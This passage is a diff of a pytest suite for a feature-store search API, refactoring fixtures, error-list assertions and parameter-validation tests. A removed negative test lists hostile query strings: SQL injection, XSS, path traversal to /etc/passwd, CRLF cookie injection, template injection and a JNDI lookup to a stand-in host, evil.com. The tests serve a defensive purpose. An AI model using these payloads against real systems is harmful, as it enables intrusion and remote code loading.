@@ -552,38 +552,36 @@ def multi_project_search_test_app():
 
     tmp_dir.cleanup()
 
-
+@pytest.fixture
+def shared_search_responses(search_test_app):
+    """Pre-computed responses for common search scenarios to reduce API calls"""
+    return {
+        "user_query": search_test_app.get("/search?query=user").json(),
+        "empty_query": search_test_app.get("/search?query=").json(),
+        "nonexistent_query": search_test_app.get(
+            "/search?query=xyz_12345"
+        ).json(),
+        "paginated_basic": search_test_app.get(
+            "/search?query=&page=1&limit=5"
+        ).json(),
+        "paginated_page2": search_test_app.get(
+            "/search?query=&page=2&limit=3"
+        ).json(),
+        "sorted_by_name": search_test_app.get(
+            "/search?query=&sort_by=name&sort_order=asc"
+        ).json(),
+        "sorted_by_match_score": search_test_app.get(
+            "/search?query=user&sort_by=match_score&sort_order=desc"
+        ).json(),
+        "with_tags": search_test_app.get(
+            "/search?query=&tags=team:data"
+        ).json(),
+        "feature_name_query": search_test_app.get(
+            "/search?query=age"
+        ).json(),
+    }
 class TestSearchAPI:
     """Test class for the comprehensive search API"""
-
-    @pytest.fixture
-    def shared_search_responses(self, search_test_app):
-        """Pre-computed responses for common search scenarios to reduce API calls"""
-        return {
-            "user_query": search_test_app.get("/search?query=user").json(),
-            "empty_query": search_test_app.get("/search?query=").json(),
-            "demographic_query": search_test_app.get(
-                "/search?query=demographic"
-            ).json(),
-            "nonexistent_query": search_test_app.get(
-                "/search?query=nonexistent_resource_xyz_12345"
-            ).json(),
-            "paginated_basic": search_test_app.get(
-                "/search?query=&page=1&limit=5"
-            ).json(),
-            "paginated_page2": search_test_app.get(
-                "/search?query=&page=2&limit=3"
-            ).json(),
-            "sorted_by_name": search_test_app.get(
-                "/search?query=&sort_by=name&sort_order=asc"
-            ).json(),
-            "sorted_by_match_score": search_test_app.get(
-                "/search?query=user&sort_by=match_score&sort_order=desc"
-            ).json(),
-            "with_tags": search_test_app.get(
-                "/search?query=user&tags=team:data"
-            ).json(),
-        }
 
     def test_search_user_query_comprehensive(self, shared_search_responses):
         """Comprehensive test for user query validation - combines multiple test scenarios"""
@@ -594,6 +592,7 @@ class TestSearchAPI:
         assert "pagination" in data
         assert "query" in data
         assert "projects_searched" in data
+        assert "errors" in data
         assert data["query"] == "user"
 
         # Test pagination structure
@@ -606,6 +605,10 @@ class TestSearchAPI:
         # Test results content
         results = data["results"]
         assert len(results) > 0
+        result = results[0]
+        required_result_fields = ["type", "name", "description", "project", "match_score"]
+        for field in required_result_fields:
+            assert field in result
 
         # Log for debugging
         type_counts = {}
@@ -635,7 +638,7 @@ class TestSearchAPI:
         # Test cross-project functionality (replaces test_search_cross_project_when_no_project_specified)
         assert len(data["projects_searched"]) >= 1
         assert "test_project" in data["projects_searched"]
-
+    
     def test_search_with_project_filter(self, search_test_app):
         """Test searching within a specific project"""
         response = search_test_app.get("/search?query=user&projects=test_project")
@@ -679,51 +682,24 @@ class TestSearchAPI:
                     "No resources found with 'demographic' in description - search may not be working properly"
                 )
 
-    def test_search_by_tags(self, search_test_app):
+    def test_search_by_tags(self, shared_search_responses):
         """Test searching by tag content"""
-        response = search_test_app.get("/search?query=finance")
-        assert response.status_code == 200
-
-        data = response.json()
-        results = data["results"]
-
-        # Should find transaction-related resources tagged with "finance"
+        # Get tags filtered results
+        tags_data = shared_search_responses["with_tags"]
+        logger.debug(f"Tags data: {tags_data}")
+        results = tags_data["results"]
         assert len(results) > 0
 
-    def test_search_by_feature_names(self, search_test_app):
-        """Test searching by feature names in feature views"""
-        response = search_test_app.get("/search?query=income")
-        assert response.status_code == 200
+        
+        # Should find user-related resources that also have "team": "data" tag
+        expected_resources = {"user", "user_features", "user_service"}
+        found_resources = {r["name"] for r in results}
 
-        data = response.json()
-        results = data["results"]
-
-        # Debug: Show what we found
-        logger.debug(f"Search for 'income' returned {len(results)} results:")
-        for r in results:
-            features = r.get("features", [])
-            logger.debug(
-                f"  - {r['type']}: {r['name']} - features: {features} (score: {r.get('match_score', 'N/A')})"
-            )
-
-        # Should find user_features which contains "income" feature
-        feature_views_with_income = [
-            r
-            for r in results
-            if r["type"] == "featureView" and "income" in r.get("features", [])
-        ]
-        if len(feature_views_with_income) == 0:
-            # Check if any feature views exist at all
-            all_feature_views = [r for r in results if r["type"] == "featureView"]
-            logger.debug(
-                f"Found {len(all_feature_views)} feature views total, but none with 'income' feature"
-            )
-            # Make this a warning rather than a hard failure until we understand the issue
-            logger.warning(
-                "No feature views found with 'income' feature - this may indicate a search API issue"
-            )
-        else:
-            assert len(feature_views_with_income) > 0
+        # Check intersection rather than strict subset (more flexible)
+        found_expected = expected_resources.intersection(found_resources)
+        assert len(found_expected) > 0, (
+            f"Expected to find some of {expected_resources} but found none in {found_resources}"
+        )
 
     def test_search_sorting_functionality(self, shared_search_responses):
         """Test search results sorting using pre-computed responses"""
@@ -754,21 +730,106 @@ class TestSearchAPI:
         assert len(empty_data["results"]) > 0
         assert empty_data["query"] == ""
 
+        results = empty_data["results"]
+
+        # Get all resource types returned
+        returned_types = set(result["type"] for result in results)
+
+        # Should include all expected resource types (including new 'feature' type)
+        expected_types = {
+            "entity",
+            "featureView",
+            "feature",
+            "featureService",
+            "dataSource",
+            "savedDataset",
+        }
+
+        # All expected types should be present (or at least no filtering happening)
+        # Note: Some types might not exist in test data, but if they do exist, they should all be returned
+        available_types_in_data = expected_types.intersection(returned_types)
+        assert len(available_types_in_data) >= 4, (
+            f"Expected multiple resource types in results, but only got {returned_types}. "
+            "All available resource types should be searched."
+        )
+
+        # Verify feature result structure
+        for result in results:
+            # Check required fields
+            assert "type" in result
+            assert "name" in result
+            assert "description" in result
+            assert "project" in result
+        
+        # Get all feature results
+        feature_results = [result for result in results if result["type"] == "feature"]
+
+        # Should have individual features in search results
+        assert len(feature_results) > 0, (
+            "Expected individual features to appear in search results, but found none"
+        )
+
+        # Verify we have features that likely come from different feature views
+        feature_names = {f["name"] for f in feature_results}
+
+        # Based on test fixture features: age, income (from user_features), price, category (from product_features),
+        # amount, payment_method (from transaction_features)
+        expected_features = {
+            "age",
+            "income",
+            "price",
+            "category",
+            "amount",
+            "payment_method",
+        }
+        found_features = expected_features.intersection(feature_names)
+
+        assert len(found_features) >= 3, (
+            f"Expected features from multiple feature views, but only found features: {feature_names}. "
+            f"Expected to find at least 3 of: {expected_features}"
+        )
+
+        # Get all feature view results to understand the source feature views
+        feature_view_results = [
+            result for result in results if result["type"] == "featureView"
+        ]
+        feature_view_names = {fv["name"] for fv in feature_view_results}
+
+        # Based on test fixture: user_features, product_features, transaction_features
+        expected_feature_views = {
+            "user_features",
+            "product_features",
+            "transaction_features",
+        }
+
+        # Should have feature views from test fixture
+        found_feature_views = expected_feature_views.intersection(feature_view_names)
+        assert len(found_feature_views) >= 2, (
+            f"Expected features from multiple feature views, but only found feature views: {feature_view_names}. "
+            f"Expected to find some of: {expected_feature_views}"
+        )
+
         # Test nonexistent query
         nonexistent_data = shared_search_responses["nonexistent_query"]
-        assert nonexistent_data["query"] == "nonexistent_resource_xyz_12345"
-        results = nonexistent_data["results"]
-        if len(results) > 0:
-            logger.debug(f"Found {len(results)} results for nonexistent query:")
-            for r in results:
-                logger.debug(
-                    f"  - {r['type']}: {r['name']} (score: {r.get('match_score', 'N/A')})"
-                )
+        logger.debug(f"Nonexistent data: {nonexistent_data}")
+        assert len(nonexistent_data["results"]) == 0
 
-        # Test demographic description search
-        demographic_data = shared_search_responses["demographic_query"]
-        assert demographic_data["query"] == "demographic"
-        # Description search should find matching results (count depends on test data)
+        # Search for a specific feature name 'age'
+        age_feature_response = shared_search_responses["feature_name_query"]
+
+        results = age_feature_response["results"]
+
+        # Should find feature named "age"
+        age_features = [
+            result
+            for result in results
+            if result["type"] == "feature" and "age" in result["name"].lower()
+        ]
+
+        assert len(age_features) > 0, (
+            "Expected to find feature named 'age' in search results"
+        )
+
 
     def test_search_fuzzy_matching(self, search_test_app):
         """Test fuzzy matching functionality with assumed threshold of 0.6"""
@@ -808,162 +869,6 @@ class TestSearchAPI:
                 f"  - {match['name']}: score {match.get('match_score', 'N/A')}"
             )
 
-    def test_search_response_format(self, search_test_app):
-        """Test that search response has correct format"""
-        response = search_test_app.get("/search?query=user&resource_types=entities")
-        assert response.status_code == 200
-
-        data = response.json()
-
-        # Check required response fields
-        required_fields = [
-            "results",
-            "pagination",
-            "query",
-            "projects_searched",
-        ]
-        for field in required_fields:
-            assert field in data
-
-        # Check individual result format
-        if data["results"]:
-            result = data["results"][0]
-            required_result_fields = ["type", "name", "description", "project"]
-            for field in required_result_fields:
-                assert field in result
-
-    def test_search_with_invalid_resource_type(self, search_test_app):
-        """Test search with invalid resource type"""
-        response = search_test_app.get("/search?query=user&resource_types=invalid_type")
-        assert response.status_code == 200
-
-        data = response.json()
-        # Should handle gracefully and return empty results for invalid types
-        results = data["results"]
-        assert isinstance(results, list)
-
-    def test_search_error_handling(self, search_test_app):
-        """Test API error handling for invalid requests"""
-        # Test with missing required query parameter
-        response = search_test_app.get("/search")
-        assert response.status_code == 422  # FastAPI validation error
-
-    def test_search_api_with_tags_parameter(
-        self, shared_search_responses, search_test_app
-    ):
-        """Test search API with tags filtering using shared responses"""
-
-        # Get baseline user query results
-        baseline_data = shared_search_responses["user_query"]
-        baseline_results = baseline_data["results"]
-
-        logger.debug(f"Baseline 'user' query found {len(baseline_results)} results:")
-        for r in baseline_results:
-            logger.debug(f"  - {r['type']}: {r['name']} - tags: {r.get('tags', {})}")
-
-        # Get tags filtered results
-        tags_data = shared_search_responses["with_tags"]
-        assert "results" in tags_data
-        results = tags_data["results"]
-
-        logger.debug(f"'user&tags=team:data' query found {len(results)} results:")
-        for r in results:
-            logger.debug(f"  - {r['type']}: {r['name']} - tags: {r.get('tags', {})}")
-
-        # Check if tags filtering is working at all
-        if len(results) == 0:
-            logger.warning("Tags filtering returned no results - investigating...")
-
-            # Test if tags parameter is being processed
-            # Check if API supports tags parameter by testing empty query with tags
-            response_tags_only = search_test_app.get("/search?query=&tags=team:data")
-            assert response_tags_only.status_code == 200
-            tags_only_results = response_tags_only.json()["results"]
-
-            logger.debug(
-                f"Empty query with tags=team:data found {len(tags_only_results)} results:"
-            )
-            for r in tags_only_results:
-                logger.debug(
-                    f"  - {r['type']}: {r['name']} - tags: {r.get('tags', {})}"
-                )
-
-            if len(tags_only_results) == 0:
-                logger.warning(
-                    "DIAGNOSIS: Tags filtering appears to not be implemented or not working"
-                )
-                logger.warning(
-                    "           Skipping tag-specific assertions until tags feature is fixed"
-                )
-                return  # Skip the rest of the test
-            else:
-                logger.warning(
-                    "DIAGNOSIS: Tags filtering works for empty query but not with 'user' query"
-                )
-                logger.warning(
-                    "           This suggests tags + query combination may have issues"
-                )
-
-        # Only run these assertions if tags filtering appears to work
-        if len(results) > 0:
-            # Should find user-related resources that also have "team": "data" tag
-            expected_resources = {"user", "user_features", "user_service"}
-            found_resources = {r["name"] for r in results}
-
-            # Check intersection rather than strict subset (more flexible)
-            found_expected = expected_resources.intersection(found_resources)
-            assert len(found_expected) > 0, (
-                f"Expected to find some of {expected_resources} but found none in {found_resources}"
-            )
-
-            # Verify all results actually have the requested tag
-            for result in results:
-                tags = result.get("tags", {})
-                assert tags.get("team") == "data", (
-                    f"Resource '{result['name']}' should have 'team': 'data' tag but has tags: {tags}"
-                )
-
-        # Test with environment tag (separate test)
-        response_env = search_test_app.get("/search?query=&tags=environment:test")
-        assert response_env.status_code == 200
-
-        env_data = response_env.json()
-        env_results = env_data["results"]
-
-        logger.debug(
-            f"Empty query with tags=environment:test found {len(env_results)} results:"
-        )
-        entity_results = [r for r in env_results if r["type"] == "entity"]
-        logger.debug(
-            f"       Entities found: {len(entity_results)} - {[r['name'] for r in entity_results]}"
-        )
-
-        # Only assert if tags filtering appears to work
-        if len(env_results) > 0:
-            # Should find entities with environment:test tag (allow for internal entities)
-            non_internal_entities = [
-                r for r in entity_results if not r.get("name", "").startswith("__")
-            ]
-            assert len(non_internal_entities) >= 3, (
-                f"Expected at least 3 non-internal entities with environment:test tag, but found {len(non_internal_entities)}"
-            )
-        else:
-            logger.warning(
-                "Environment tag filtering also returned no results - tags feature may not be implemented"
-            )
-
-    def test_search_api_performance_with_large_query(self, search_test_app):
-        """Test API performance with complex queries"""
-        # Test with long query string
-        long_query = (
-            "user product transaction features data demographic catalog payment"
-        )
-        response = search_test_app.get(f"/search?query={long_query}")
-        assert response.status_code == 200
-
-        data = response.json()
-        assert "results" in data
-
     def test_search_api_special_characters(self, search_test_app):
         """Test search API with special characters in query and verify expected results"""
         # Define expected matches for each special character query
@@ -998,10 +903,6 @@ class TestSearchAPI:
                 ],  # Partial match on "source"
                 "description": "Space-separated query should find data sources",
             },
-            "version_2.0": {
-                "should_find": ["product_features"],  # Has "version": "v2" tag
-                "description": "Version-like query should find v2 resources",
-            },
         }
 
         for query, expectation in special_query_expectations.items():
@@ -1011,6 +912,7 @@ class TestSearchAPI:
             data = response.json()
             assert "results" in data
             assert isinstance(data["results"], list)
+            assert data["pagination"]["totalCount"] > 0
 
             results = data["results"]
             found_names = {r["name"] for r in results}
@@ -1035,12 +937,6 @@ class TestSearchAPI:
                         assert match_score > 0, (
                             f"Expected positive match score for '{result['name']}' but got {match_score}"
                         )
-            else:
-                # If no expected resources found, that's acceptable for special character queries
-                # as long as the API doesn't crash
-                logger.warning(
-                    f"No expected resources found for '{query}' - search may be strict with special characters"
-                )
 
             # Verify query echo-back works with special characters
             assert data["query"] == query, (
@@ -1064,25 +960,14 @@ class TestSearchAPI:
         # Should search only existing projects, non-existing ones are ignored
         expected_projects = ["test_project"]  # only existing project
         assert data["projects_searched"] == expected_projects
-        assert data["error"] == "Following projects do not exist: another_project"
+        logger.debug(f"Errors: {data['errors']}")
+        assert "Following projects do not exist: another_project" in data["errors"]
+        assert data["errors"] == ["Following projects do not exist: another_project"]
 
         # Results should include project information
         for result in data["results"]:
             if "project" in result:
                 assert result["project"] in expected_projects
-
-    def test_search_single_project_in_list(self, search_test_app):
-        """Test searching a single project using projects parameter"""
-        response = search_test_app.get("/search?query=user&projects=test_project")
-        assert response.status_code == 200
-
-        data = response.json()
-        assert data["projects_searched"] == ["test_project"]
-
-        # Results should include project information
-        for result in data["results"]:
-            if "project" in result:
-                assert result["project"] == "test_project"
 
     def test_search_empty_projects_parameter_searches_all(self, search_test_app):
         """Test that empty projects parameter still searches all projects"""
@@ -1106,26 +991,9 @@ class TestSearchAPI:
         # Should return empty results since projects don't exist
         assert data["results"] == []
         assert not data["pagination"].get("totalCount", False)
-        assert (
-            data["error"]
-            == "Following projects do not exist: nonexistent1, nonexistent2"
-        )
-
-    def test_search_mixed_existing_nonexistent_projects(self, search_test_app):
-        """Test searching in mix of existing and non-existing projects"""
-        response = search_test_app.get(
-            "/search?query=user&projects=test_project&projects=nonexistent_project"
-        )
-        assert response.status_code == 200
-
-        data = response.json()
-        assert data["projects_searched"] == ["test_project"]  # only existing project
-        assert data["error"] == "Following projects do not exist: nonexistent_project"
-
-        # Should only find results from existing project
-        for result in data["results"]:
-            if "project" in result:
-                assert result["project"] == "test_project"
+        assert len(data["errors"]) == 1
+        for proj in ["nonexistent1", "nonexistent2"]:
+            assert proj in data["errors"][0]
 
     def test_search_many_projects_performance(self, search_test_app):
         """Test search performance with many projects"""
@@ -1140,9 +1008,10 @@ class TestSearchAPI:
         data = response.json()
         assert len(data["projects_searched"]) == 1  # only 1 real project exists
         assert "test_project" in data["projects_searched"]
-        assert data["error"] == "Following projects do not exist: " + ", ".join(
-            fake_projects
-        )
+        assert len(data["errors"]) == 1
+
+        for proj in fake_projects:
+            assert proj in data["errors"][0]
 
         # Should still return results from the one existing project
         if data["results"]:
@@ -1160,7 +1029,128 @@ class TestSearchAPI:
         data = response.json()
         # API should handle duplicates gracefully (may or may not deduplicate)
         # At minimum, should not crash and should search test_project
-        assert "test_project" in data["projects_searched"]
+        assert len(data["projects_searched"]) == 1
+        assert "test_project" == data["projects_searched"][0]        
+
+    def test_search_missing_required_query_parameter(self, search_test_app):
+        """Test search API fails when required query parameter is missing"""
+        response = search_test_app.get("/search")
+        assert response.status_code == 422  # Unprocessable Entity
+
+        error_data = response.json()
+        assert "detail" in error_data
+        # FastAPI should return validation error for missing required field
+        assert any("query" in str(error).lower() for error in error_data["detail"])
+
+    @pytest.mark.parametrize(
+        "test_cases",
+        [
+            [
+                ("sort_by", "invalid_sort_field", "sort_order", "desc", 400),
+                ("sort_by", "name", "sort_order", "invalid_order", 400),
+                ("sort_by", "", "sort_order", "asc", 200),
+                ("sort_by", "match_score", "sort_order", "", 200),
+                ("sort_by", "123", "sort_order", "xyz", 400),
+                (
+                    "allow_cache",
+                    "invalid_bool",
+                    None,
+                    None,
+                    422,
+                ),  # FastAPI may handle gracefully
+                (
+                    "allow_cache",
+                    "yes",
+                    None,
+                    None,
+                    200,
+                ),  # FastAPI converts to boolean
+                (
+                    "allow_cache",
+                    "1",
+                    None,
+                    None,
+                    200,
+                ),  # FastAPI converts to boolean
+            ],
+        ]
+    )
+    def test_search_with_invalid_parameters(
+        self, search_test_app, test_cases
+    ):
+        """Test search API with various invalid parameter combinations"""
+        logger.debug(f"Test cases: {test_cases}")
+        for param1, value1, param2, value2, expected_code in test_cases:
+            # Build query string
+            query_parts = ["query=user"]
+            query_parts.append(f"{param1}={value1}")
+            if param2 is not None and value2 is not None:
+                query_parts.append(f"{param2}={value2}")
+
+            url = "/search?" + "&".join(query_parts)
+            response = search_test_app.get(url)
+
+            assert response.status_code == expected_code, (
+                f"Expected {expected_code} but got {response.status_code} for {param1}='{value1}'"
+                + (f", {param2}='{value2}'" if param2 else "")
+            )
+
+            if response.status_code == 200:
+                # If successful, verify response format
+                data = response.json()
+                assert "results" in data
+                assert isinstance(data["results"], list)
+            elif response.status_code in [400, 422]:
+                # If validation error, verify it's a proper FastAPI error
+                error_data = response.json()
+                assert "detail" in error_data
+
+    def test_search_with_extremely_long_query(self, search_test_app):
+        """Test search API with extremely long query string"""
+        # Create a very long query (10KB)
+        long_query = "a" * 10000
+
+        response = search_test_app.get(f"/search?query={long_query}")
+        assert response.status_code == 200  # Should handle large queries gracefully
+
+        data = response.json()
+        assert "results" in data
+        assert data["query"] == long_query
+
+    def test_search_with_malformed_and_edge_case_parameters(self, search_test_app):
+        """Test search API with malformed parameters and edge case values"""
+        # Test malformed tags
+        malformed_tags = [
+            "invalid_tag_format",
+            "key1:value1:extra",
+            "=value_without_key",
+            "key_without_value=",
+            "::",
+            "key1=value1&key2",
+            "key with spaces:value",
+        ]
+
+        for malformed_tag in malformed_tags:
+            response = search_test_app.get(f"/search?query=test&tags={malformed_tag}")
+            assert response.status_code == 200
+            data = response.json()
+            assert "results" in data
+
+        # Test empty and null-like query values
+        empty_scenarios = [
+            ("", "empty string"),
+            ("   ", "whitespace only"),
+            ("null", "string 'null'"),
+            ("undefined", "string 'undefined'"),
+            ("None", "string 'None'"),
+        ]
+
+        for query_value, description in empty_scenarios:
+            response = search_test_app.get(f"/search?query={query_value}")
+            assert response.status_code == 200, f"Failed for {description}"
+            data = response.json()
+            assert "results" in data
+            assert data["query"] == query_value
 
     def test_search_all_resource_types_individually(self, search_test_app):
         """Test that all resource types can be searched individually and return only that type"""
@@ -1414,7 +1404,8 @@ class TestSearchAPIMultiProjectComprehensive:
         assert response.status_code == 200
 
         data = response.json()
-        assert data["projects_searched"] == ["project_a", "project_b"]
+        for proj in ["project_a", "project_b"]:
+            assert proj in data["projects_searched"]
 
         # Should find user_features from both specified projects
         user_features_results = [
@@ -1589,171 +1580,6 @@ class TestSearchAPIMultiProjectComprehensive:
         assert "ride sharing" in desc_a
         assert "food delivery" in desc_b
 
-    def test_all_resource_types_always_searched(self, search_test_app):
-        """Test that all resource types are always included in search results"""
-        response = search_test_app.get("/search?query=")
-        assert response.status_code == 200
-
-        data = response.json()
-        results = data["results"]
-
-        # Get all resource types returned
-        returned_types = set(result["type"] for result in results)
-
-        # Should include all expected resource types (including new 'feature' type)
-        expected_types = {
-            "entity",
-            "featureView",
-            "feature",
-            "featureService",
-            "dataSource",
-            "savedDataset",
-        }
-
-        # All expected types should be present (or at least no filtering happening)
-        # Note: Some types might not exist in test data, but if they do exist, they should all be returned
-        available_types_in_data = expected_types.intersection(returned_types)
-        assert len(available_types_in_data) >= 4, (
-            f"Expected multiple resource types in results, but only got {returned_types}. "
-            "All available resource types should be searched."
-        )
-
-    def test_features_as_individual_search_results(self, search_test_app):
-        """Test that individual features appear as separate search results"""
-        response = search_test_app.get("/search?query=")
-        assert response.status_code == 200
-
-        data = response.json()
-        results = data["results"]
-
-        # Find feature results
-        feature_results = [result for result in results if result["type"] == "feature"]
-
-        # Should have individual features in results
-        assert len(feature_results) > 0, (
-            "Expected individual features to appear in search results, but found none"
-        )
-
-        # Verify feature result structure
-        for feature_result in feature_results:
-            # Check required fields
-            assert "type" in feature_result
-            assert "name" in feature_result
-            assert "description" in feature_result
-            assert "project" in feature_result
-
-            # Verify values
-            assert feature_result["type"] == "feature"
-            assert isinstance(feature_result["name"], str)
-
-    def test_feature_search_by_name(self, search_test_app):
-        """Test that individual features can be found by searching their names"""
-        # Based on test fixture, we should have features like "age", "income", "price", etc.
-
-        # Search for a specific feature name
-        response = search_test_app.get("/search?query=age")
-        assert response.status_code == 200
-
-        data = response.json()
-        results = data["results"]
-
-        # Should find feature named "age"
-        age_features = [
-            result
-            for result in results
-            if result["type"] == "feature" and "age" in result["name"].lower()
-        ]
-
-        assert len(age_features) > 0, (
-            "Expected to find feature named 'age' in search results"
-        )
-
-        # Verify the age feature has correct structure
-        age_feature = age_features[0]
-        assert age_feature["name"] == "age"
-
-    def test_features_from_multiple_feature_views(self, search_test_app):
-        """Test that features from different feature views all appear in search results"""
-        response = search_test_app.get("/search?query=")
-        assert response.status_code == 200
-
-        data = response.json()
-        results = data["results"]
-
-        # Get all feature results
-        feature_results = [result for result in results if result["type"] == "feature"]
-
-        # Should have individual features in search results
-        assert len(feature_results) > 0, (
-            "Expected individual features to appear in search results, but found none"
-        )
-
-        # Get all feature view results to understand the source feature views
-        feature_view_results = [
-            result for result in results if result["type"] == "featureView"
-        ]
-        feature_view_names = {fv["name"] for fv in feature_view_results}
-
-        # Based on test fixture: user_features, product_features, transaction_features
-        expected_feature_views = {
-            "user_features",
-            "product_features",
-            "transaction_features",
-        }
-
-        # Should have feature views from test fixture
-        found_feature_views = expected_feature_views.intersection(feature_view_names)
-        assert len(found_feature_views) >= 2, (
-            f"Expected features from multiple feature views, but only found feature views: {feature_view_names}. "
-            f"Expected to find some of: {expected_feature_views}"
-        )
-
-        # Verify we have features that likely come from different feature views
-        feature_names = {f["name"] for f in feature_results}
-
-        # Based on test fixture features: age, income (from user_features), price, category (from product_features),
-        # amount, payment_method (from transaction_features)
-        expected_features = {
-            "age",
-            "income",
-            "price",
-            "category",
-            "amount",
-            "payment_method",
-        }
-        found_features = expected_features.intersection(feature_names)
-
-        assert len(found_features) >= 3, (
-            f"Expected features from multiple feature views, but only found features: {feature_names}. "
-            f"Expected to find at least 3 of: {expected_features}"
-        )
-
-    def test_feature_search_includes_different_feature_types(self, search_test_app):
-        """Test that features of different data types appear in search results"""
-        response = search_test_app.get("/search?query=")
-        assert response.status_code == 200
-
-        data = response.json()
-        results = data["results"]
-
-        # Get all feature results
-        feature_results = [result for result in results if result["type"] == "feature"]
-
-        # Get unique feature names - should include various types from test fixture
-        feature_names = set(result["name"] for result in feature_results)
-
-        # Based on test fixture, should include features like:
-        # From user_features: age, income
-        # From product_features: price, category
-        # From transaction_features: amount, merchant
-        expected_features = {"age", "income", "price", "category", "amount", "merchant"}
-
-        # Should find several of these features
-        found_features = feature_names.intersection(expected_features)
-        assert len(found_features) >= 3, (
-            f"Expected to find multiple features like {expected_features}, but only found {found_features}"
-        )
-
     def test_search_feature_view_entity_relationships_across_projects(
         self, multi_project_search_test_app
     ):
@@ -1851,10 +1677,11 @@ class TestSearchAPIMultiProjectComprehensive:
         assert response.status_code == 200
 
         data = response.json()
-        assert data["projects_searched"] == [
-            "project_a",
-            "project_b",
-        ]  # only existing projects
+        assert len(data["errors"]) == 1
+        assert "nonexistent_project" in data["errors"][0]
+
+        for proj in ["project_a", "project_b"]:
+            assert proj in data["projects_searched"]
 
         # Should only find results from existing projects
         projects_with_results = set()
@@ -1862,230 +1689,17 @@ class TestSearchAPIMultiProjectComprehensive:
             if "project" in result:
                 projects_with_results.add(result["project"])
 
-        # Should only contain existing projects, not the nonexistent one
-        assert data["error"] == "Following projects do not exist: nonexistent_project"
         assert projects_with_results.issubset({"project_a", "project_b"})
-
-
-class TestSearchAPINegativeScenarios:
-    """Test class for negative scenarios and error handling in search API"""
-
-    def test_search_missing_required_query_parameter(self, search_test_app):
-        """Test search API fails when required query parameter is missing"""
-        response = search_test_app.get("/search")
-        assert response.status_code == 422  # Unprocessable Entity
-
-        error_data = response.json()
-        assert "detail" in error_data
-        # FastAPI should return validation error for missing required field
-        assert any("query" in str(error).lower() for error in error_data["detail"])
-
-    def test_search_with_nonexistent_project(self, search_test_app):
-        """Test search API with non-existent project"""
-        response = search_test_app.get(
-            "/search?query=user&projects=nonexistent_project_xyz"
-        )
-        assert response.status_code == 200  # Should not fail, just return empty results
-
-        data = response.json()
-        assert (
-            data["projects_searched"] == []
-        )  # single non-existent project returns empty list
-        assert not data["pagination"].get("totalCount", False)
-        assert data["results"] == []
-        assert (
-            data["error"] == "Following projects do not exist: nonexistent_project_xyz"
-        )
-
-    @pytest.mark.parametrize(
-        "parameter_type,test_cases",
-        [
-            (
-                "sorting",
-                [
-                    ("sort_by", "invalid_sort_field", "sort_order", "desc", 400),
-                    ("sort_by", "name", "sort_order", "invalid_order", 400),
-                    ("sort_by", "", "sort_order", "asc", 200),
-                    ("sort_by", "match_score", "sort_order", "", 200),
-                    ("sort_by", "123", "sort_order", "xyz", 400),
-                ],
-            ),
-            (
-                "boolean",
-                [
-                    (
-                        "allow_cache",
-                        "invalid_bool",
-                        None,
-                        None,
-                        422,
-                    ),  # FastAPI may handle gracefully
-                    (
-                        "allow_cache",
-                        "yes",
-                        None,
-                        None,
-                        200,
-                    ),  # FastAPI converts to boolean
-                    (
-                        "allow_cache",
-                        "1",
-                        None,
-                        None,
-                        200,
-                    ),  # FastAPI converts to boolean
-                ],
-            ),
-        ],
-    )
-    def test_search_with_invalid_parameters(
-        self, search_test_app, parameter_type, test_cases
-    ):
-        """Test search API with various invalid parameter combinations"""
-        for param1, value1, param2, value2, expected_code in test_cases:
-            # Build query string
-            query_parts = ["query=user"]
-            query_parts.append(f"{param1}={value1}")
-            if param2 is not None and value2 is not None:
-                query_parts.append(f"{param2}={value2}")
-
-            url = "/search?" + "&".join(query_parts)
-            response = search_test_app.get(url)
-
-            assert response.status_code == expected_code, (
-                f"Expected {expected_code} but got {response.status_code} for {param1}='{value1}'"
-                + (f", {param2}='{value2}'" if param2 else "")
-            )
-
-            if response.status_code == 200:
-                # If successful, verify response format
-                data = response.json()
-                assert "results" in data
-                assert isinstance(data["results"], list)
-            elif response.status_code in [400, 422]:
-                # If validation error, verify it's a proper FastAPI error
-                error_data = response.json()
-                assert "detail" in error_data
-
-    def test_search_with_malicious_query_injection_attempts(self, search_test_app):
-        """Test search API with potential injection attacks"""
-        malicious_queries = [
-            "'; DROP TABLE entities; --",
-            "<script>alert('xss')</script>",
-            "../../etc/passwd",
-            "${jndi:ldap://evil.com/a}",
-            "{{7*7}}",  # Template injection
-            "%0d%0aSet-Cookie:hacked=true",  # CRLF injection
-            "\\x00\\x01\\x02",  # Null bytes
-            "SELECT * FROM users",
-            "UNION SELECT password FROM admin",
-            "../../../../../etc/hosts",
-        ]
-
-        for malicious_query in malicious_queries:
-            response = search_test_app.get(f"/search?query={malicious_query}")
-            assert (
-                response.status_code == 200
-            )  # Should handle gracefully without crashing
-
-            data = response.json()
-            assert "results" in data
-            assert isinstance(data["results"], list)
-            # Should treat as normal search query, not execute any malicious code
-
-    def test_search_with_extremely_long_query(self, search_test_app):
-        """Test search API with extremely long query string"""
-        # Create a very long query (10KB)
-        long_query = "a" * 10000
-
-        response = search_test_app.get(f"/search?query={long_query}")
-        assert response.status_code == 200  # Should handle large queries gracefully
-
-        data = response.json()
-        assert "results" in data
-        assert data["query"] == long_query
-
-    def test_search_with_unicode_and_special_encoding(self, search_test_app):
-        """Test search API with unicode characters and special encoding"""
-
-        # Split into safe and unsafe characters
-        safe_unicode_queries = [
-            "用户特征",  # Chinese characters
-            "ñoño",  # Spanish with tildes
-            "café",  # French with accents
-            "москва",  # Cyrillic
-            "🔍🎯📊",  # Emojis
-        ]
-
-        unsafe_queries = [
-            "test null",  # Replace null bytes with space (safe equivalent)
-            "test space tab",  # Replace special whitespace with normal text
-        ]
-
-        # Test safe unicode queries
-        for unicode_query in safe_unicode_queries:
-            response = search_test_app.get(f"/search?query={quote(unicode_query)}")
-            assert response.status_code == 200
-
-            data = response.json()
-            assert "results" in data
-            assert isinstance(data["results"], list)
-
-        # Test unsafe queries (should be handled gracefully)
-        for unsafe_query in unsafe_queries:
-            response = search_test_app.get(f"/search?query={quote(unsafe_query)}")
-            assert response.status_code == 200
-
-            data = response.json()
-            assert "results" in data
-            assert isinstance(data["results"], list)
-
-    def test_search_with_malformed_and_edge_case_parameters(self, search_test_app):
-        """Test search API with malformed parameters and edge case values"""
-        # Test malformed tags
-        malformed_tags = [
-            "invalid_tag_format",
-            "key1:value1:extra",
-            "=value_without_key",
-            "key_without_value=",
-            "::",
-            "key1=value1&key2",
-            "key with spaces:value",
-        ]
-
-        for malformed_tag in malformed_tags:
-            response = search_test_app.get(f"/search?query=test&tags={malformed_tag}")
-            assert response.status_code == 200
-            data = response.json()
-            assert "results" in data
-
-        # Test empty and null-like query values
